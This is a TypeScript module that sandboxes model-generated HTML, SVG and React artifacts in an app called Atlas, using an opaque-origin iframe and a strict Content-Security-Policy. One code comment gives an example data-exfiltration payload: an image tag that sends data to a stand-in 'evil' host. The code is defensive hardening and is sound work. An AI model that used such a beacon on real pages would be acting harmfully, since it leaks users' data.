// Containment for model-generated artifact code.
//
// Artifacts are written by a language model and are therefore untrusted input.
// Two mechanisms keep them contained, and they only work together:
//
//  1. `sandbox="allow-scripts"` WITHOUT `allow-same-origin`. Granting both is
//     self-defeating: the frame would run at Atlas's own origin and could read
//     `parent.localStorage`, which is where the user's OpenRouter key lives.
//     Omitting `allow-same-origin` puts the frame on an opaque origin, so the
//     parent DOM, its storage, and its cookies are all unreachable.
//  2. The CSP from `cspFor()`, which decides what the frame may load or reach.
//
// This module is pure (no React, no DOM) so the policy itself can be unit
// tested — the rules below are a security boundary, not styling.

/**
 * Artifact kinds the panel knows how to render.
 *
 * `document` and `slides` are prose, not programs: a report, a research sheet or
 * a deck, written in Markdown. They are deliberately NOT executable — there is
 * no reason to run model-authored script to show a document, and rendering them
 * with the app's own trusted Markdown renderer keeps raw HTML escaped rather
 * than merely sandboxed.
 */
export type ArtifactType =
  | "html"
  | "svg"
  | "markdown"
  | "code"
  | "mermaid"
  | "react"
  | "document"
  | "slides";

export interface Artifact {
  type: ArtifactType;
  lang: string;
  code: string;
  title: string;
  /**
   * False while the code is still arriving — a fenced block whose closing fence
   * has not appeared yet, which is the normal state mid-stream and the permanent
   * state when the provider truncated the response. The panel previews these
   * anyway; what it must not do is record one as a version the user can revert to.
   */
  complete?: boolean;
  /**
   * The file this artifact is, when the fence named one with `path="…"`.
   *
   * Relative and validated (see `validFencePath`). Absent for the single
   * unnamed artifact a conversation used to be limited to, which is what keeps
   * every existing conversation rendering exactly as before.
   */
  path?: string;
}

/** sessionStorage handoff key for the pop-out preview shell. */
export const ARTIFACT_PREVIEW_KEY = "atlas-artifact-preview";

/**
 * The sandbox attribute every artifact frame must use.
 *
 * `allow-same-origin` is absent on purpose and must stay absent. Combining it
 * with `allow-scripts` lets the frame reach out of the sandbox entirely.
 */
export const ARTIFACT_SANDBOX = "allow-scripts allow-popups allow-modals";

/** Artifact types that execute code and therefore must render sandboxed. */
export function isExecutable(t: ArtifactType): boolean {
  return t === "html" || t === "svg" || t === "react";
}

/** Artifact types made of prose, rendered by the app's own Markdown renderer. */
export function isProse(t: ArtifactType): boolean {
  return t === "document" || t === "slides" || t === "markdown";
}

/**
 * Where a "Save as PDF" has to be driven from.
 *
 * Two paths, because the two kinds of artifact live in different documents.
 * An executable artifact is inside an opaque-origin iframe the parent cannot
 * reach into, so it has to print *itself* on request. A prose artifact is
 * rendered by the parent, so the parent builds a paginated document and prints
 * that. `null` means there is nothing worth paginating.
 */
export function printModeFor(t: ArtifactType): "frame" | "dom" | null {
  if (isExecutable(t)) return "frame";
  if (isProse(t) || t === "mermaid" || t === "code") return "dom";
  return null;
}

/**
 * Content-Security-Policy for an artifact document.
 *
 * `connect-src 'none'` is the anti-exfiltration rule: even a malicious artifact
 * has no channel to send anything out. `img-src` omits remote hosts for the same
 * reason — `<img src="https://evil/?data">` is a GET request. Remote scripts are
 * excluded too, which is what §1.4 (zero telemetry) requires; the React/Babel
 * runtime is served from Atlas's own origin instead (scripts/vendor-artifact-runtime.mjs).
 *
 * `'unsafe-eval'` is unavoidable: Babel executes the transpiled component. It is
 * an acceptable cost here precisely because the frame is origin-isolated and has
 * `connect-src 'none'` — there is nothing to steal and nowhere to send it.
 *
 * `origin` must be an absolute origin. An opaque-origin document cannot resolve
 * `'self'` or a root-relative path back to Atlas.
 */
export function cspFor(origin: string): string {
  return [
    "default-src 'none'",
    `script-src 'unsafe-inline' 'unsafe-eval' ${origin}`,
    `style-src 'unsafe-inline' ${origin}`,
    `img-src data: blob: ${origin}`,
    `font-src data: ${origin}`,
    "media-src data: blob:",
    "connect-src 'none'",
    "form-action 'none'",
    "base-uri 'none'",
    "frame-src 'none'",
    "object-src 'none'",
  ].join("; ");
}

/**
 * Put the CSP meta ahead of anything executable in a model-authored document,
 * followed by the `window.storage` shim.
 *
 * A `<meta http-equiv>` policy only governs what follows it, so it has to lead
 * `<head>`; if the model omitted the boilerplate we synthesize just enough. The
 * shim goes immediately after, so artifact code can call `storage.get()` at top
 * level without waiting for anything.
 */
export function withCsp(html: string, origin: string, head = ""): string {
  const meta = `<meta http-equiv="Content-Security-Policy" content="${cspFor(origin)}">${head}`;
  const headOpen = /<head[^>]*>/i.exec(html);
  if (headOpen) {
    const at = headOpen.index + headOpen[0].length;
    return html.slice(0, at) + meta + html.slice(at);
  }
  const htmlOpen = /<html[^>]*>/i.exec(html);
  if (htmlOpen) {
    const at = htmlOpen.index + htmlOpen[0].length;
    return `${html.slice(0, at)}<head>${meta}</head>${html.slice(at)}`;
  }
  return `<!DOCTYPE html><html><head>${meta}</head><body>${html}</body></html>`;
}

/** Class attributes in HTML or JSX, in any of the quoting styles models use. */
const CLASS_ATTR = /\bclass(?:Name)?\s*=\s*(?:"[^"]*"|'[^']*'|\{`[^`]*`\}|\{"[^"]*"\})/g;

/**
 * A Tailwind utility class: either a standalone keyword, a variant-prefixed
 * class, or one of the `prefix-value` families.
 */
const TAILWIND_UTILITY =
  /\b(?:flex|grid|hidden|block|inline-flex|inline-block|container|sr-only|antialiased|uppercase|italic|underline|truncate|(?:sm|md|lg|xl|2xl|hover|focus|active|dark|group-hover|motion-safe|motion-reduce):[a-z0-9/[\].#%_-]+|(?:bg|text|border|rounded|shadow|font|leading|tracking|opacity|p|px|py|pt|pb|pl|pr|m|mx|my|mt|mb|ml|mr|w|h|min-w|min-h|max-w|max-h|gap|space-x|space-y|justify|items|self|order|col-span|row-span|grid-cols|z|inset|top|left|right|bottom|translate-x|translate-y|rotate|scale|duration|ease|delay|transition|ring|outline|divide|backdrop|object|overflow|cursor|from|via|to)-[a-z0-9/[\].#%_-]+)\b/g;

/**
 * Whether an artifact is written in Tailwind.
 *
 * Deliberately conservative — **three distinct utility classes**, inside class
 * attributes, not anywhere in the source. Tailwind v4 ships preflight, which
 * resets margins, list styles and heading sizes, so loading it onto a page that
 * wrote its own CSS would break that page's styling. One incidental
 * `class="block"` is not enough evidence to take that risk; a real Tailwind page
 * has dozens.
 */
export function usesTailwind(code: string): boolean {
  const attrs = code.match(CLASS_ATTR);
  if (!attrs) return false;
  const hits = new Set<string>();
  for (const attr of attrs) {
    for (const m of attr.matchAll(TAILWIND_UTILITY)) {
      hits.add(m[0]);
      if (hits.size >= 3) return true;
    }
  }
  return false;
}

/**
 * The pinned runtime set (spec §4), served from Atlas's own origin by
 * scripts/vendor-artifact-runtime.mjs.
 *
 * Loaded conditionally: the whole set is several megabytes, and shipping it to
 * every artifact would make a ten-line component slow to render. Most detectors
 * match the global the UMD build exposes, which is how artifact code refers to
 * these libraries anyway.
 *
 * Tailwind is here as of P10. It used to be excluded because the only
 * distribution was a third-party CDN, which §1.4 rules out — but
 * `@tailwindcss/browser` is an npm package, so it is vendored and served from
 * Atlas's own origin exactly like React is. It compiles in the page and makes no
 * network request of its own (verified: the bundle contains no `fetch` and no
 * `XMLHttpRequest`). Excluding it was itself a bug: models write landing pages in
 * Tailwind whatever the system prompt says, and the result rendered as unstyled
 * text.
 */
export const RUNTIME_LIBS: { file: string; detect: (code: string) => boolean }[] = [
  { file: "recharts.js", detect: (c) => /\bRecharts\b|<(Line|Bar|Area|Pie|Radar|Scatter)Chart\b/.test(c) },
  { file: "d3.js", detect: (c) => /\bd3\s*\./.test(c) },
  { file: "three.js", detect: (c) => /\bTHREE\s*\./.test(c) },
  {
    file: "mathjs.js",
    detect: (c) => /\bmath\s*\.\s*(evaluate|parse|matrix|unit|chain|derivative|simplify)\b/.test(c),
  },
  { file: "papaparse.js", detect: (c) => /\bPapa\s*\./.test(c) },
  { file: "lucide-react.js", detect: (c) => /\blucide\b|\bLucideReact\b/i.test(c) },
  // Motion is the global framer-motion's UMD exposes. The bare specifier is
  // matched too, because the import line survives into the bundled output as a
  // `require` call and is the most reliable signal that the page wants it.
  {
    file: "framer-motion.js",
    detect: (c) => /\bframer-motion\b|\bMotion\b|\bmotion\s*\.\s*[a-z]/.test(c),
  },
  { file: "tailwind.js", detect: usesTailwind },
];

/**
 * The shim bundle, which every artifact gets whether it asked or not.
 *
 * Two reasons it is unconditional rather than detected. It is small, so the
 * branch would save nothing measurable. And it carries the `window.react`
 * lowercase alias that lucide-react's UMD needs (see scripts/artifact-shims.js),
 * which means it has to be parsed *before* any detected library — a detector
 * could only ever match the same code that already decided lucide loads, so
 * ordering it first by construction is simpler than ordering it first by luck.
 */
const SHIM_FILE = "atlas-shims.js";

/**
 * Script tags for the shim bundle plus whichever optional libraries this
 * artifact actually references.
 *
 * Order is load-bearing: the shims come first because lucide-react reads its
 * React reference at parse time, and framer-motion and lucide-react both read
 * globals the earlier `react.js` tag defines.
 */
export function optionalLibTags(code: string, origin: string): string {
  const tag = (file: string) => `\n<script src="${origin}/artifact-runtime/${file}"></script>`;
  return (
    tag(SHIM_FILE) +
    RUNTIME_LIBS.filter((l) => l.detect(code))
      .map((l) => tag(l.file))
      .join("")
  );
}

/** Wrap a bare JSX/TSX component in a runnable document. */
export function buildReactDoc(code: string, origin: string, head = ""): string {
  const cleaned = code
    .split("\n")
    .filter((l) => !/^\s*import\s.+from\s+['"]/.test(l))
    .join("\n")
    .replace(/export\s+default\s+function/, "function")
    .replace(/export\s+default\s+class/, "class")
    .replace(/export\s+default\s+/, "window.__ATLAS_DEFAULT__ = ");
  // No `crossorigin` attribute: the frame's origin is opaque, so a CORS-mode
  // fetch would send `Origin: null` and be rejected. A plain no-cors script load
  // is what we want, and the CSP already restricts where it may come from.
  return `<!DOCTYPE html><html><head>
<meta http-equiv="Content-Security-Policy" content="${cspFor(origin)}">${head}
<script src="${origin}/artifact-runtime/react.js"></script>
<script src="${origin}/artifact-runtime/react-dom.js"></script>${optionalLibTags(code, origin)}
<script src="${origin}/artifact-runtime/babel.js"></script>
<style>body{margin:0;font-family:system-ui,sans-serif;background:#101112;color:#E9E9EA;padding:16px}</style>
</head><body><div id="root"></div>
<script type="text/babel" data-presets="react,typescript">
${cleaned}
const __root = ReactDOM.createRoot(document.getElementById('root'));
const __Comp = (typeof App !== 'undefined' && App) || window.__ATLAS_DEFAULT__;
__root.render(__Comp ? React.createElement(__Comp) : React.createElement('pre', null, 'No <App/> or default export found.'));
</script></body></html>`;
}

/**
 * The full document to hand an artifact iframe, or "" if the type isn't
 * executable.
 *
 * `head` is extra markup injected right after the CSP — used to inject the
 * `window.storage` shim. Passed in rather than imported so this module stays
 * free of the storage layer and remains testable in isolation.
 */
export function docFor(a: Artifact, origin: string, head = ""): string {
  // HTML artifacts can use the pinned libraries too — a plain page charting
  // data with d3 is as common as a React one.
  if (a.type === "html") return withCsp(a.code, origin, head + optionalLibTags(a.code, origin));
  if (a.type === "react") return buildReactDoc(a.code, origin, head);
  if (a.type === "svg")
    return withCsp(
      `<!DOCTYPE html><html><head><style>html,body{margin:0;height:100%;display:grid;place-items:center;background:#101112}</style></head><body>${a.code}</body></html>`,
      origin,
      head,
    );
  return "";
}
